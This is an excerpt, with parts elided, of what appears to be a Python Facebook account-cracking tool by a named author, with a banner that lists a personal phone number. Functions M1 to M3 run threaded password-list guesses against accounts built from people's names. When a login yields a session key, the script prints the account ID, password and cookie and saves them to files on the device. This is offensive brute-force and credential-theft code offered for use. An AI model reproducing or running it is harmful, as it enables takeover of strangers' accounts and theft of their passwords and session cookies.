...
o88o     o8888o     o888o        `YbodP'    8""88888P'  o888o   o888o 

\033[91;1m╔════════════════════════════════════════╗
{H}║{P}[{H}•{P}] Author    :{warna} AYUSH PRASHAD JOSHI        {N}{H}║
{H}║{P}[{H}•{P}] Facebook  : {H}आयुष प्रसाद जोशी          {N}{H}║
{H}║{P}[{H}•{P}] Whatsapp  : {M}+977 9769936293      {N}{H}║
                    ...
                    #    print('[5] Follow Facebook')
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f"\r FOR SPEED BOOST ON/OFF AIRPLANE MODE 🚀 ")
...
def M1(ids,names,passlist):
                try:
                        global loop, ok, cp
                        sys.stdout.write('\r\r\033[1;32m[\033[1;37mAYUSH -M1\033[1;32m]\033[1;36m(%s)\033[1;33m+\033[1;39mOK(%s)\033[1;39m \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;37m[\033[1;32mAYUSH -OK]\033[1;37m \033[1;32m'+ids+' \033[1;37m| \033[1;32m'+pas+'\033[1;97m')
                                        print(f'\r[🍪]{warna}'+cookie);print(led)
                                        open('/sdcard/AYUSH _OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AYUSH _COOKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
...
def M2(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write('\r\r\033[1;32m[\033[1;37mAYUSH -M2\033[1;32m]\033[1;36m(%s)\033[1;33m+\033[1;39mOK(%s)\033[1;39m \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def M3(ids,names,passlist):
                try:
                        global loop, ok, cp
                        animasi = random.choice(["\x1b[1;91mAYUSH ","\x1b[1;92mAYUSH ","\x1b[1;93mAYUSH ","\x1b[1;94mAYUSH ","\x1b[1;95mAYUSH ","\x1b[1;96mAYUSH ","\x1b[1;97mAYUSH ","\x1b[1;91mAYUSH ","\x1b[1;92mAYUSH ","\x1b[1;93mAYUSH ","\x1b[1;94mAYUSH ","\x1b[1;95mAYUSH ","\x1b[1;96mAYUSH "])
                        sys.stdout.write('\r\r\033[1;32m[\033[1;37mAYUSH -M3\033[1;32m]\033[1;36m(%s)\033[1;33m+\033[1;39mOK(%s)\033[1;39m \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
